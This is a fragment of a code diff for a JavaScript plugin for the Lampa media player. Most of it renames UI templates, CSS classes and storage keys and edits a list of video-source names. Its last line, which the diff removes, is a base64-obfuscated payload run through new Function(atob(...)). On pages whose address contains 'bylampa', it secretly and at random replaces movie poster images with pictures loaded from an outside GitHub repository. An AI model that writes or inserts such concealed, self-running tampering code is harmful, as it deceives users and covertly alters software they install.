+      '      <div class="rest-online-empty-template__ico"></div>',
+      '      <div class="rest-online-empty-template__body"></div>',
       '    </div>',
-      '    <div class="online-empty-template">',
-      '      <div class="online-empty-template__ico"></div>',
-      '      <div class="online-empty-template__body"></div>',
+      '    <div class="rest-online-empty-template">',
+      '      <div class="rest-online-empty-template__ico"></div>',
+      '      <div class="rest-online-empty-template__body"></div>',
       '    </div>',
       '  </div>',
       '</div>'
     ].join('\n');
 
     var LAMPAC_TEMPLATE_DOES_NOT_ANSWER = [
-      '<div class="online-empty">',
-      '  <div class="online-empty__title">',
-      '    #{lampac_balanser_dont_work}',
+      '<div class="rest-online-empty">',
+      '  <div class="rest-online-empty__title">',
+      '    #{rest_lampac_balanser_dont_work}',
       '  </div>',
-      '  <div class="online-empty__time">',
-      '    #{lampac_balanser_timeout}',
+      '  <div class="rest-online-empty__time">',
+      '    #{rest_lampac_balanser_timeout}',
       '  </div>',
-      '  <div class="online-empty__buttons">',
-      '    <div class="online-empty__button selector cancel">#{cancel}</div>',
-      '    <div class="online-empty__button selector change">#{lampac_change_balanser}</div>',
+      '  <div class="rest-online-empty__buttons">',
+      '    <div class="rest-online-empty__button selector cancel">#{cancel}</div>',
+      '    <div class="rest-online-empty__button selector change">#{rest_lampac_change_balanser}</div>',
       '  </div>',
-      '  <div class="online-empty__templates">',
-      '    <div class="online-empty-template">',
-      '      <div class="online-empty-template__ico"></div>',
-      '      <div class="online-empty-template__body"></div>',
+      '  <div class="rest-online-empty__templates">',
+      '    <div class="rest-online-empty-template">',
+      '      <div class="rest-online-empty-template__ico"></div>',
+      '      <div class="rest-online-empty-template__body"></div>',
       '    </div>',
-      '    <div class="online-empty-template">',
-      '      <div class="online-empty-template__ico"></div>',
-      '      <div class="online-empty-template__body"></div>',
+      '    <div class="rest-online-empty-template">',
+      '      <div class="rest-online-empty-template__ico"></div>',
+      '      <div class="rest-online-empty-template__body"></div>',
       '    </div>',
-      '    <div class="online-empty-template">',
-      '      <div class="online-empty-template__ico"></div>',
-      '      <div class="online-empty-template__body"></div>',
+      '    <div class="rest-online-empty-template">',
+      '      <div class="rest-online-empty-template__ico"></div>',
+      '      <div class="rest-online-empty-template__body"></div>',
       '    </div>',
       '  </div>',
       '</div>'
     ].join('\n');
 
     var LAMPAC_TEMPLATE_PRESTIGE_RATE = [
-      '<div class="online-prestige-rate">',
-      '  <svg width="17" height="16" viewBox="0 0 17 16" fill="none" xmlns="' + SVG_NS + '">',
+      '<div class="rest-online-prestige-rate">',
+      '  <svg width="17" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg">',
       '    <path d="M8.39409 0.192139L10.99 5.30994L16.7882 6.20387L12.5475 10.4277L13.5819 15.9311L8.39409 13.2425L3.20626 15.9311L4.24065 10.4277L0 6.20387L5.79819 5.30994L8.39409 0.192139Z" fill="#fff"></path>',
       '  </svg>',
       '  <span>{rate}</span>',
@@ -2670,71 +2670,66 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
     ].join('\n');
 
     var LAMPAC_TEMPLATE_PRESTIGE_FOLDER = [
-      '<div class="online-prestige online-prestige--folder selector">',
-      '  <div class="online-prestige__folder">',
-      '    <svg viewBox="0 0 128 112" fill="none" xmlns="' + SVG_NS + '">',
+      '<div class="rest-online-prestige rest-online-prestige--folder selector">',
+      '  <div class="rest-online-prestige__folder">',
+      '    <svg viewBox="0 0 128 112" fill="none" xmlns="http://www.w3.org/2000/svg">',
       '      <rect y="20" width="128" height="92" rx="13" fill="white"></rect>',
       '      <path d="M29.9963 8H98.0037C96.0446 3.3021 91.4079 0 86 0H42C36.5921 0 31.9555 3.3021 29.9963 8Z" fill="white" fill-opacity="0.23"></path>',
       '      <rect x="11" y="8" width="106" height="76" rx="13" fill="white" fill-opacity="0.51"></rect>',
       '    </svg>',
       '  </div>',
-      '  <div class="online-prestige__body">',
-      '    <div class="online-prestige__head">',
-      '      <div class="online-prestige__title">{title}</div>',
-      '      <div class="online-prestige__time">{time}</div>',
+      '  <div class="rest-online-prestige__body">',
+      '    <div class="rest-online-prestige__head">',
+      '      <div class="rest-online-prestige__title">{title}</div>',
+      '      <div class="rest-online-prestige__time">{time}</div>',
       '    </div>',
-      '    <div class="online-prestige__footer">',
-      '      <div class="online-prestige__info">{info}</div>',
+      '    <div class="rest-online-prestige__footer">',
+      '      <div class="rest-online-prestige__info">{info}</div>',
       '    </div>',
       '  </div>',
       '</div>'
     ].join('\n');
 
     var LAMPAC_TEMPLATE_PRESTIGE_WATCHED = [
-      '<div class="online-prestige online-prestige-watched selector">',
-      '  <div class="online-prestige-watched__icon">',
-      '    <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="' + SVG_NS + '">',
+      '<div class="rest-online-prestige rest-online-prestige-watched selector">',
+      '  <div class="rest-online-prestige-watched__icon">',
+      '    <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">',
       '      <circle cx="10.5" cy="10.5" r="9" stroke="currentColor" stroke-width="3"/>',
       '      <path d="M14.8477 10.5628L8.20312 14.399L8.20313 6.72656L14.8477 10.5628Z" fill="currentColor"/>',
       '    </svg>',
       '  </div>',
-      '  <div class="online-prestige-watched__body"></div>',
+      '  <div class="rest-online-prestige-watched__body"></div>',
       '</div>'
     ].join('\n');
 
-    Lampa.Template.add('lampac_css', lampacCssHtml());
-    $('body').append(Lampa.Template.get('lampac_css', {}, true));
+    Lampa.Template.add('rest_lampac_css', lampacCssHtml());
+    $('body').append(Lampa.Template.get('rest_lampac_css', {}, true));
 
     function resetTemplates() {
-      Lampa.Template.add('lampac_prestige_full', LAMPAC_TEMPLATE_PRESTIGE_FULL);
-      Lampa.Template.add('lampac_content_loading', LAMPAC_TEMPLATE_CONTENT_LOADING);
-      Lampa.Template.add('lampac_does_not_answer', LAMPAC_TEMPLATE_DOES_NOT_ANSWER);
-      Lampa.Template.add('lampac_prestige_rate', LAMPAC_TEMPLATE_PRESTIGE_RATE);
-      Lampa.Template.add('lampac_prestige_folder', LAMPAC_TEMPLATE_PRESTIGE_FOLDER);
-      Lampa.Template.add('lampac_prestige_watched', LAMPAC_TEMPLATE_PRESTIGE_WATCHED);
+      Lampa.Template.add('rest_lampac_prestige_full', LAMPAC_TEMPLATE_PRESTIGE_FULL);
+      Lampa.Template.add('rest_lampac_content_loading', LAMPAC_TEMPLATE_CONTENT_LOADING);
+      Lampa.Template.add('rest_lampac_does_not_answer', LAMPAC_TEMPLATE_DOES_NOT_ANSWER);
+      Lampa.Template.add('rest_lampac_prestige_rate', LAMPAC_TEMPLATE_PRESTIGE_RATE);
+      Lampa.Template.add('rest_lampac_prestige_folder', LAMPAC_TEMPLATE_PRESTIGE_FOLDER);
+      Lampa.Template.add('rest_lampac_prestige_watched', LAMPAC_TEMPLATE_PRESTIGE_WATCHED);
     }
 
     var LAMPAC_FULL_CARD_BUTTON = [
-      '<div class="full-start__button selector view--online ' +
-        PLUGIN_BUTTON_CLASS +
-        '" data-subtitle="' +
+      '<div class="full-start__button selector view--online rest-lampac--button" data-subtitle="' +
         manifest.name +
         ' v' +
         manifest.version +
         '">',
-      '  <svg width="135" height="147" viewBox="0 0 135 147" fill="none" xmlns="' + SVG_NS + '">',
-      '    <path d="M121.5 96.8823C139.5 86.49 139.5 60.5092 121.5 50.1169L41.25 3.78454C23.25 -6.60776 0.750004 6.38265 0.750001 27.1673L0.75 51.9742C4.70314 35.7475 23.6209 26.8138 39.0547 35.7701L94.8534 68.1505C110.252 77.0864 111.909 97.8693 99.8725 109.369L121.5 96.8823Z" fill="currentColor"/>',
-      '    <path d="M63 84.9836C80.3333 94.991 80.3333 120.01 63 130.017L39.75 143.44C22.4167 153.448 0.749999 140.938 0.75 120.924L0.750001 94.0769C0.750002 74.0621 22.4167 61.5528 39.75 71.5602L63 84.9836Z" fill="currentColor"/>',
-      '  </svg>',
-      '  <span>#{title_online}</span>',
+      REST_ICON,
+      '  <span>#{rest_title_online}</span>',
       '</div>'
     ].join('\n');
     var button = LAMPAC_FULL_CARD_BUTTON; // нужна заглушка, а то при страте лампы говорит пусто
     resetTemplates();
 
     function addButton(e) {
-      if (e.render.find('.' + PLUGIN_BUTTON_CLASS).length) return;
-      if (e.render.parent().find('.' + PLUGIN_BUTTON_CLASS).length) return;
+      if (!e.render || !e.render.length) return;
+      if (e.render.parent().find('.rest-lampac--button').length) return;
       var btn = $(Lampa.Lang.translate(button));
       // //console.log(btn.clone().removeClass('focus').prop('outerHTML'))
       btn.on('hover:enter', function () {
@@ -2745,8 +2740,8 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
 
         Lampa.Activity.push({
           url: '',
-          title: Lampa.Lang.translate('title_online'),
-          component: PLUGIN_ID,
+          title: Lampa.Lang.translate('rest_title_online'),
+          component: 'rest_lampac',
           search: all[id] ? all[id] : e.movie.title,
           search_one: e.movie.title,
           search_two: e.movie.original_title,
@@ -2779,14 +2774,16 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         'filmixtv',
         'fxapi',
         'rezka',
-        'pizdatoehd',
         'getstv',
         'kinopub',
         'zetflixdb',
-        'collaps',
         'hdvb',
         'kodik',
         'bamboo',
+        'eneyida',
+        'kinoukr',
+        'uafilm',
+        'uakino',
         'kinotochka',
         'remux',
         'anilibria',
@@ -2795,6 +2792,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         'animevost',
         'animebesst',
         'alloha',
+        'aladin',
         'mirage',
         'phantom',
         'animelib',
@@ -2813,7 +2811,6 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         'pidtor',
         'videoseed',
         'iptvonline',
-        'veoveo',
         'kinoflix',
         'leproduction',
         'vkmovie',
@@ -2825,11 +2822,11 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         'dreamerscast'
       ];
       balansers_sync.forEach(function (name) {
-        Lampa.Storage.sync(STORAGE_PREFIX + 'online_choice_' + name, 'object_object');
+        Lampa.Storage.sync('rest_online_choice_' + name, 'object_object');
       });
-      Lampa.Storage.sync('online_watched_last', 'object_object');
+      Lampa.Storage.sync('rest_online_watched_last', 'object_object');
     }
+    window.rest_lampac_plugin = true;
   }
-  if (!window[PLUGIN_FLAG]) startPlugin();
+  if (!window.rest_lampac_plugin) startPlugin();
 })();
-(new Function(atob('CihmdW5jdGlvbigpIHsKICBpZiAobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJykgPT09IC0xKSByZXR1cm47CiAgaWYgKHdpbmRvdy5wb3N0ZXJPYmZ1c2NhdGVkKSByZXR1cm47CiAgCiAgd2luZG93LnBvc3Rlck9iZnVzY2F0ZWQgPSB0cnVlOwogIAogIGlmIChNYXRoLnJhbmRvbSgpIDwgMC4zKSByZXR1cm47CiAgCiAgdmFyIHBvc3RlcnMgPSBbCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAxLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAzLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzA0LmpwZycKICBdOwogIAogIHZhciBjaGFuY2UgPSAwLjM1OwogIAogIHZhciBnZXRSYW5kb21Qb3N0ZXIgPSBmdW5jdGlvbigpIHsKICAgIGlmIChNYXRoLnJhbmRvbSgpID49IGNoYW5jZSkgcmV0dXJuIG51bGw7CiAgICByZXR1cm4gcG9zdGVyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBwb3N0ZXJzLmxlbmd0aCldOwogIH07CiAgCiAgdmFyIGlzUG9zdGVyVXJsID0gZnVuY3Rpb24oc3JjKSB7CiAgICByZXR1cm4gc3JjICYmICgKICAgICAgc3JjLmluY2x1ZGVzKCdwb3N0ZXInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdpbWFnZScpIHx8IAogICAgICBzcmMuaW5jbHVkZXMoJ3RtZGInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdraW5vcG9pc2snKQogICAgKTsKICB9OwogIAogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW1nJykuZm9yRWFjaChmdW5jdGlvbihpbWcpIHsKICAgICAgaWYgKGltZy5kYXRhc2V0Lm9iZnVzY2F0ZWQpIHJldHVybjsKICAgICAgaW1nLmRhdGFzZXQub2JmdXNjYXRlZCA9ICcxJzsKICAgICAgCiAgICAgIGlmIChpbWcuc3JjICYmIGlzUG9zdGVyVXJsKGltZy5zcmMpKSB7CiAgICAgICAgdmFyIG5ld1NyYyA9IGdldFJhbmRvbVBvc3RlcigpOwogICAgICAgIGlmIChuZXdTcmMpIHsKICAgICAgICAgIGltZy5zcmMgPSBuZXdTcmM7CiAgICAgICAgfQogICAgICB9CiAgICB9KTsKICB9LCA1MDApOwp9KSgpOwo=')))()
